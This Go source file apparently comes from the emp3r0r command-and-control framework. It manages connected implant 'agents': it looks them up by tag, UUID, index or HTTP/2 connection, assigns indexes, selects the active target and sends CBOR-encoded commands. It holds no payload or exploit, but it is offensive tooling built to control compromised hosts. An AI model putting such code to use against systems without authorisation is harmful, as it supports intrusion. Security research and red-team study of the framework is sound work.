package agents

import (
	"crypto/sha1"
	"fmt"
	"sort"
	"strconv"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

func GetConnectedAgents() []*def.Emp3r0rAgent {
	var agents []*def.Emp3r0rAgent
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		agent := key.(*def.Emp3r0rAgent)
		shortID := fmt.Sprintf("%x", sha1.Sum([]byte(agent.UUID+agent.UUIDSig)))
		if len(shortID) > 8 {
			shortID = shortID[:8]
		}
		agent.ShortID = shortID
		agents = append(agents, agent)
		return true
	})
	return agents
}

// GetAgentByIndex find target from def.AgentControlMap via control index, return nil if not found
func GetAgentByIndex(index int) (target *def.Emp3r0rAgent) {
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		t := key.(*def.Emp3r0rAgent)
		ctl := value.(*live.AgentControl)
		if ctl.Index == index {
			target = t
			return false // stop iteration
		}
		return true
	})
	return
}

// GetAgentByTag find target from def.AgentControlMap via tag, return nil if not found
func GetAgentByTag(tag string) (target *def.Emp3r0rAgent) {
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		t := key.(*def.Emp3r0rAgent)
		if t.Tag == tag {
			target = t
			return false // stop iteration
		}
		return true
	})
	if target == nil {
		for _, t := range live.AgentList {
			if t.Tag == tag {
				target = t
				break
			}
		}
	}
	return
}

// GetAgentByUUID find target from def.AgentControlMap via UUID, return nil if not found
func GetAgentByUUID(uuid string) (target *def.Emp3r0rAgent) {
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		t := key.(*def.Emp3r0rAgent)
		if t.UUID == uuid {
			target = t
			return false // stop iteration
		}
		return true
	})
	if target == nil {
		for _, t := range live.AgentList {
			if t.UUID == uuid {
				target = t
				break
			}
		}
	}
	return
}

// IsAgentExistByUUID is agent already in target list?
func IsAgentExistByUUID(uuid string) bool {
	exists := false
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		a := key.(*def.Emp3r0rAgent)
		if a.UUID == uuid {
			exists = true
			return false // stop iteration
		}
		return true
	})
	return exists
}

// GetTargetFromH2Conn find target from def.AgentControlMap via HTTP2 connection ID, return nil if not found
func GetTargetFromH2Conn(conn *h2conn.Conn) (target *def.Emp3r0rAgent) {
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		t := key.(*def.Emp3r0rAgent)
		ctrl := value.(*live.AgentControl)
		if ctrl.Conn == nil {
			return true
		}
		// Check keys (not valid if using encryption, but kept for safety if wrappers change)
		// We cannot directly compare net.Conn with *h2conn.Conn if they are not compatible.
		// Instead we inspect wrappers.

		// Check SecureConn wrapper
		if secure, ok := ctrl.Conn.(*transport.SecureConn); ok {
			// Check ByteReadWriteCloser wrapper (since h2conn doesn't implement net.Conn)
			if wrapped, ok := secure.Conn.(*transport.ByteReadWriteCloser); ok {
				if wrapped.ReadWriteCloser == conn {
					target = t
					return false // stop iteration
				}
			}
		}
		return true
	})
	return
}

// SendMessageToAgent send MsgTunData to agent
func SendMessageToAgent(msg_data *def.MsgTunData, agent *def.Emp3r0rAgent) (err error) {
	val, ok := live.AgentControlMap.Load(agent)
	if !ok {
		return fmt.Errorf("Send2Agent (%s): Target is not connected", msg_data.CmdSlice)
	}
	ctrl := val.(*live.AgentControl)
	if ctrl.Conn == nil {
		return fmt.Errorf("Send2Agent (%s): Target is not connected", msg_data.CmdSlice)
	}
	out := cbor.NewEncoder(ctrl.Conn)

	err = out.Encode(msg_data)
	return
}

// SetActiveAgent set the active agent as the target
func SetActiveAgent(identifier string) {
	parsedArgs := util.ParseCmd(identifier)
	target := parsedArgs[0]
	var target_to_set *def.Emp3r0rAgent

	// select by tag or index
	target_to_set = GetAgentByTag(target)
	if target_to_set == nil {
		index, e := strconv.Atoi(target)
		if e == nil {
			target_to_set = GetAgentByIndex(index)
		}
	}

	if target_to_set == nil {
		// if still nothing
		logging.Errorf("Target does not exist, no target has been selected")
		return
	} else {
		live.ActiveAgent = target_to_set
	}
}

// IsAgentExistByTag is agent already in target list?
func IsAgentExistByTag(tag string) bool {
	exists := false
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		a := key.(*def.Emp3r0rAgent)
		if a.Tag == tag {
			exists = true
			return false // stop iteration
		}
		return true
	})
	return exists
}

// IsAgentExist is agent already in target list?
func IsAgentExist(t *def.Emp3r0rAgent) bool {
	exists := false
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		a := key.(*def.Emp3r0rAgent)
		if a.UUID == t.UUID {
			exists = true
			return false // stop iteration
		}
		return true
	})
	return exists
}

// AssignAgentIndex assign an index number to new agent
func AssignAgentIndex() (index int) {
	// loop thru agent list and get all index numbers
	index_list := make([]int, 0)
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		c := value.(*live.AgentControl)
		index_list = append(index_list, c.Index)
		return true
	})

	// index is 0 for the first agent
	if len(index_list) == 0 {
		return 0
	}

	// sort
	sort.Ints(index_list)

	// find available numbers
	available_indexes := make([]int, 0)
	for i := 0; i < len(index_list); i++ {
		if index_list[i] != i {
			available_indexes = append(available_indexes, i)
		}
	}
	if len(available_indexes) == 0 {
		return len(index_list)
	}

	// use the smallest available number
	return available_indexes[0]
}
